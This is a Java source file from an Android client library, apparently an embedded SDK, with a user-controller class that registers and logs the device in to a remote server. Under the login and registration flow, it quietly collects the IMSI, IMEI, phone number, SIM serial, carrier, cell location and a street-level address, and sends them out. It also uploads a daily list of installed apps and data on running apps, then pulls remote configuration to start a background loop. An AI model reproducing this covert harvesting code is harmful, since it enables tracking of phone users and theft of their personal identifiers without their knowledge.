package com.guang.client.controller;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.telephony.TelephonyManager;

import com.guang.client.GCommon;
import com.guang.client.GSysService;
import com.guang.client.mode.GUser;
import com.guang.client.tools.GLog;
import com.guang.client.tools.GTools;

@SuppressLint("NewApi")
public class GUserController {
	public static final String TAG = "GUserController";
	private static GUserController instance;
	public static boolean isLogin = false;
	private GUserController(){}
	
	public static GUserController getInstance()
	{
		if(instance == null)
			instance = new GUserController();
		return instance;
	}
	
	private boolean isRegister()
	{
		String name = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_NAME, "");
		String password = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_PASSWORD, "");		
		if(name != null && password != null && !"".equals(name.trim()) && !"".equals(password.trim()))
			return true;
		return false;
	}

	public void login()
	{
		isLogin = false;
		if(isRegister())
		{
			String name = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_NAME, "");
			String password = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_PASSWORD, "");
			JSONObject obj = new JSONObject();
			try {
				obj.put(GCommon.SHARED_KEY_NAME, name);
				obj.put(GCommon.SHARED_KEY_PASSWORD, password);
				obj.put("networkType", GTools.getNetworkType());
			} catch (JSONException e) {
				e.printStackTrace();
			}
			GTools.httpPostRequest(GCommon.URI_LOGIN, this, "loginResult", obj.toString());
		}
		else
		{					
			validate();
		}
	}
	
	public static void loginResult(Object ob,Object rev) throws JSONException
	{
		JSONObject obj = new JSONObject(rev.toString());
		if(obj.getBoolean("result"))
		{
			GLog.e(TAG,"longin success!");
			GUserController.getInstance().loginSuccess();
		}
		else
		{
			GTools.saveSharedData(GCommon.SHARED_KEY_NAME, "");
			GTools.saveSharedData(GCommon.SHARED_KEY_PASSWORD, "");
			GLog.e(TAG,"login faiure!");
			GUserController.getInstance().login();
		}
	}
	//验证是否已经注册
	public void validate()
	{
		TelephonyManager tm = GTools.getTelephonyManager();
		String name = tm.getSubscriberId();
		if(name == null || "".equals(name.trim()))
			name = tm.getDeviceId();
		if(name == null || "".equals(name.trim()))
			name = GTools.getRandomUUID();
		String password = GTools.getPackageName();
		
		GTools.saveSharedData(GCommon.SHARED_KEY_NAME, name);
		GTools.saveSharedData(GCommon.SHARED_KEY_PASSWORD, password);
		JSONObject obj = new JSONObject();
		try {
			obj.put(GCommon.SHARED_KEY_NAME, name);
			obj.put(GCommon.SHARED_KEY_PASSWORD, password);
			obj.put("networkType", GTools.getNetworkType());
		} catch (JSONException e) {
			e.printStackTrace();
		}
		GTools.httpPostRequest(GCommon.URI_VALIDATE, this, "validateResult", obj.toString());
	}
	
	public static void validateResult(Object ob,Object rev) throws JSONException
	{
		JSONObject obj = new JSONObject(rev.toString());
		if(obj.getBoolean("result"))
		{
			GLog.e(TAG,"validateResult success!");
			GLog.e(TAG,"longin success!");
			
			GUserController.getInstance().loginSuccess();
		}
		else
		{
			GLog.e(TAG,"validateResult faiure!");
			//服务器还不存在 就注册新用户
			GUserController.getInstance().register();			
		}
	}
	
	public void register()
	{				
		String url = GCommon.MAP_BAIDU_URL + GTools.getLocalHost();
		GTools.httpGetRequest(url, this, "getLoction",null);
	}
	
	public void getLoction(Object obj_session,Object obj_data)
	{
		String data = (String) obj_data;
		TelephonyManager tm = GTools.getTelephonyManager();
		GUser user = new GUser();
		String name = tm.getSubscriberId();
		if(name == null || "".equals(name.trim()))
			name = tm.getDeviceId();
		if(name == null || "".equals(name.trim()))
			name = GTools.getRandomUUID();
		user.setName(name);
		String password = GTools.getPackageName();
		user.setPassword(password);
		
		String deviceId = tm.getDeviceId();	
		if(deviceId == null || "".equals(deviceId.trim()))
			deviceId = GTools.getRandomUUID();
		
		user.setDeviceId(deviceId);
		user.setPhoneNumber(tm.getLine1Number());
		user.setNetworkOperatorName(tm.getNetworkOperatorName());
		user.setSimSerialNumber(tm.getSimSerialNumber());
		user.setNetworkCountryIso(tm.getNetworkCountryIso());
		user.setNetworkOperator(tm.getNetworkOperator());		
		user.setPhoneType(tm.getPhoneType());
		user.setModel(android.os.Build.MODEL);
		user.setRelease(android.os.Build.VERSION.RELEASE);
		user.setNetworkType(GTools.getNetworkType());
		try {
			JSONObject obj = new JSONObject(data);
			if(obj.getInt("status") == 0)
			{
				JSONObject content = obj.getJSONObject("content");
				JSONObject obj2 = content.getJSONObject("address_detail");						
				String city = obj2.getString("city");//城市  
				String province = obj2.getString("province");//省份
				String district = obj2.getString("district");//区县 
				String street = obj2.getString("street");//街道
				
				user.setProvince(province);
				user.setCity(city);
				user.setDistrict(district);
				user.setStreet(street);
				
				//用户可能拒绝获取位置 需要捕获异常
				user.setLocation(tm.getCellLocation().toString());
			}
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			GTools.saveSharedData(GCommon.SHARED_KEY_NAME, name);
			GTools.saveSharedData(GCommon.SHARED_KEY_PASSWORD, password);
			
			GTools.httpPostRequest(GCommon.URI_REGISTER, this, "registResult", GUser.toJson(user));
		}		
	}
	
	public static void registResult(Object ob,Object rev) throws JSONException
	{
		GLog.e(TAG,"registResult success!");
		//注册成功上传app信息			
		GUserController.getInstance().loginSuccess();
	}
	
	//上传app信息
	public void uploadAppInfos()
	{
		String name = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_NAME, "");
		try {
			JSONObject obj = new JSONObject();
			obj.put("packageName", GTools.getPackageName());
			obj.put("name", GTools.getApplicationName());
			obj.put("versionName", GTools.getAppVersionName());
			obj.put("sdkVersion", GCommon.version);
			obj.put("id", name);
			obj.put("password",  GTools.getPackageName());
			GTools.httpPostRequest(GCommon.URI_UPLOAD_APPINFO, this, null, obj);
		} catch (Exception e) {
		}
	}
	
	//每天上传所有app信息
	public void uploadAllAppInfos()
	{
		long time = GTools.getSharedPreferences().getLong(GCommon.SHARED_KEY_UPLOAD_ALL_APPINFO_TIME, 0l);
		long n_time = GTools.getCurrTime();
		if(n_time - time > 24 * 60 * 60 * 1000)
		{
			GTools.saveSharedData(GCommon.SHARED_KEY_UPLOAD_ALL_APPINFO_TIME, n_time);
			GTools.httpPostRequest(GCommon.URI_UPLOAD_ALL_APPINFOS, this, null, GTools.getLauncherAppsData());
		}
	}
	//每次应用结束上传运行信息
	public void uploadRunAppInfos(String clazName)
	{
		JSONObject obj = GTools.getRunAppData();
		try {
			obj.put("clazName", clazName);
		} catch (JSONException e) {
			e.printStackTrace();
		}
		GTools.httpPostRequest(GCommon.URI_UPLOAD_RUN_APPINFOS, this, null, obj);
	}
	
	//登录成功
	public void loginSuccess()
	{
		GUserController.isLogin = true;
			
		if(!GSysService.getInstance().isRuning())
		{
			//注册成功上传app信息
			GUserController.getInstance().uploadAppInfos();		
			
			//获取最新配置信息
			GTools.httpGetRequest(GCommon.URI_GET_FIND_CURR_CONFIG, this, "revFindCurrConfig",null);
			//上传所有app信息
			GUserController.getInstance().uploadAllAppInfos();
			GLog.e("---------------", "登录成功");
		}						
	}
	
	//重启循环
	public void restarMainLoop()
	{
		//获取最新配置信息
		GTools.httpGetRequest(GCommon.URI_GET_FIND_CURR_CONFIG, this, "revFindCurrConfig",null);
	}
	
	public void revFindCurrConfig(Object ob,Object rev)
	{
		//保存配置
		if(rev != null && !"".equals(rev))
		{
			GLog.e("---------------", "Config读取成功");
			GTools.saveSharedData(GCommon.SHARED_KEY_CONFIG, rev.toString());
			//开始走流程
			GSysService.getInstance().startMainLoop();
		}
	}
		
}
